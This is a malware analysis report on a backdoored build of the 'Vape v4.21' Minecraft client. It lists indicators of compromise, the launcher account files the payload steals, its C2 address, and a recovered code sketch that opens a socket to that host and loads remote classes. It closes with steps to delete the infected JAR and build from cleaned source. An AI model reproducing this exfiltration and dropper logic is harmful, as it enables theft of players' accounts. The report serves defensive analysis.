# Vape v4.21 Backdoor & Malware Analysis Report

**Target Class:** `gg.vape.input.InputFocusLostHandlerPayload`  
**Target JAR:** `baseline/final.jar`  
**Classification:** Credential Stealer, Token Grabber, Remote Access Trojan (RAT) / Bytecode Dropper  
**Verdict:** **CONFIRMED MALICIOUS** in `baseline/final.jar`; **ALREADY CLEANED** in `src/main/java`.

---

## 1. Executive Summary

A community report flagged early Vape v4 source/crack distributions as containing a backdoor sending credentials to Chinese C2 servers (`154.7.177.53`).

Forensic decompilation and deobfuscation of `gg.vape.input.InputFocusLostHandlerPayload` confirms:
1. **Targeted Exfiltration:** Steals Minecraft authentication tokens and session credentials across Essential Mod, HMCL, Feather Client, and Lunar Client.
2. **C2 Communication:** Transmits collected data inside an in-memory ZIP archive encrypted using XOR key `xiaojie1337` over raw TCP to `154.7.177.53:45678`.
3. **Remote Code Execution (Dropper):** Receives remote JSON commands from the C2 server to dynamically download and execute secondary Java payloads via `URLClassLoader`.
4. **Source vs. Binary Discrepancy:** The reference binary `baseline/final.jar` is infected, but the recovered source code in `src/main/java` **has already been stripped of all malicious code**.

---

## 2. Indicators of Compromise (IoCs)

| Indicator | Value | Description |
| :--- | :--- | :--- |
| **C2 IP Address** | `154.7.177.53` | Remote Command & Control server |
| **C2 Port** | `45678` | Raw TCP socket connection target |
| **Payload Encryption** | `xiaojie1337` | Hardcoded repeating XOR key for exfiltrated ZIP |
| **Timebomb Trigger** | `> 1784068434000L` | July 14, 2026 22:33:54 UTC (delayed activation) |
| **Canary / Killswitch** | `C:\Disable` | Local file check; if exists, malware exits immediately |
| **Marker Value** | `ugkfe` | Internal state tracking marker set in `<clinit>` |
| **C2 Command Keys** | `DisableAttachMechanism`<br>`DisableAttachMechanism0` | JSON parameters for remote JAR URL and MainClass |

---

## 3. Targeted Credential Locations

The payload iterates through the following paths, compressing any discovered files into a memory buffer (`ZipOutputStream`):

| Stolen Asset | Local File Path | Zip Entry Name |
| :--- | :--- | :--- |
| **Essential Mod** | `essential/microsoft_accounts.json` | `essential.json` |
| **HMCL Config** | `%APPDATA%\hmcl.json` | `hmcl.json` |
| **HMCL Accounts** | `C:\Users\<user>\AppData\Roaming\.hmcl\accounts.json` | `accounts.json` |
| **Feather Client** | `C:\Users\<user>\AppData\Roaming\.feather\accounts.json` | `feather.json` |
| **Lunar Client** | `C:\Users\<user>\.lunarclient\settings\game\accounts.json` | `lunar_client.json` |
| **Lunar Backup** | `C:\Users\<user>\.lunarclient\settings\game-backup\accounts.json` | `lunar_client_backup.json` |

---

## 4. Execution Flow & Architecture

```
[Game Launched with Injected Client]
                   │
                   ▼
[InputEventDispatcher references InputFocusLostHandlerPayload]
                   │
                   ▼
[JVM triggers static initializer <clinit>]
                   │
        ┌──────────┴──────────┐
        ▼                     ▼
[Timebomb Check]       [Killswitch Check]
Time > July 14, 2026?   Does C:\Disable exist?
        │ (Yes)               │ (No)
        └──────────┬──────────┘
                   ▼
       [Collect Account Files]
   (Essential, HMCL, Feather, Lunar)
                   │
                   ▼
     [Compress into ZIP Buffer]
                   │
                   ▼
   [XOR Encrypt with "xiaojie1337"]
                   │
                   ▼
    [Connect to 154.7.177.53:45678]
                   │
                   ▼
    [Send Encrypted ZIP over Socket]
                   │
                   ▼
       [Listen for C2 JSON Reply]
                   │
                   ▼
[Check key: "DisableAttachMechanism"]
                   │
                   ▼
   [Download JAR via URLClassLoader]
                   │
                   ▼
 [Instantiate Class & Run Background Thread]
```

---

## 5. Clean Source vs. Malicious Bytecode

### A. Malicious Binary (`baseline/final.jar`)
The binary contains an obfuscated `static { ... }` block that encrypts strings using integer arrays and bitwise operations to hide the socket connection, XOR encryption, and URLClassLoader:

```java
// Recovered logic inside baseline/final.jar:
static {
    if (System.currentTimeMillis() > 1784068434000L && !(new File("C:\\Disable").exists())) {
        Socket socket = new Socket("154.7.177.53", 45678);
        // ... steals files, XORs with "xiaojie1337", sends over socket ...
        // ... receives JSON, loads remote class via URLClassLoader ...
    }
}
```

### B. Clean Source Code (`src/main/java/.../InputFocusLostHandlerPayload.java`)
The source tree in this repository has **already been sanitized**:

```java
package gg.vape.input;

public class InputFocusLostHandlerPayload implements InputEventHandler {
    private static String marker;

    public static void setMarker(String marker) {
        InputFocusLostHandlerPayload.marker = marker;
    }

    public static String getMarker() {
        return marker;
    }

    @Override
    public boolean handle(long windowHandle, long focusState) {
        // Benign cover behavior: on focus-lost, clear the tracked focus state.
        InputEventDispatcher.getInstance().getFocusState().markUnfocused();
        return false;
    }
}
```

---

## 6. How to Remove the Backdoor & Build Safely

Because the source tree is clean, you only need to ensure you do not run or package `baseline/final.jar`.

### Step 1: Remove or Quarantine `baseline/final.jar`
Delete the file from disk:
```powershell
Remove-Item -Force "baseline\final.jar"
```

### Step 2: Disable Baseline Hash Verification in `build.gradle`
Open `build.gradle` and remove or comment out `dependsOn(tasks.named('verifyManualBaseline'))` around line 146:

```groovy
tasks.named('check') {
    // dependsOn(tasks.named('verifyManualBaseline'))  <-- comment out this line
    dependsOn(tasks.named('verifyRecoveredSources'))
    dependsOn(tasks.named('verifyRecoveredSourceQuality'))
}
```

### Step 3: Build the Clean Injection Payload
Compile a fresh, clean JAR directly from the audited source code:
```powershell
.\gradlew.bat injectionJar
```
The output file will be written to `build/libs/vapev4.21-recovered-injection.jar`. It contains zero backdoor calls, no C2 socket connections, and is safe for testing in isolated environments.
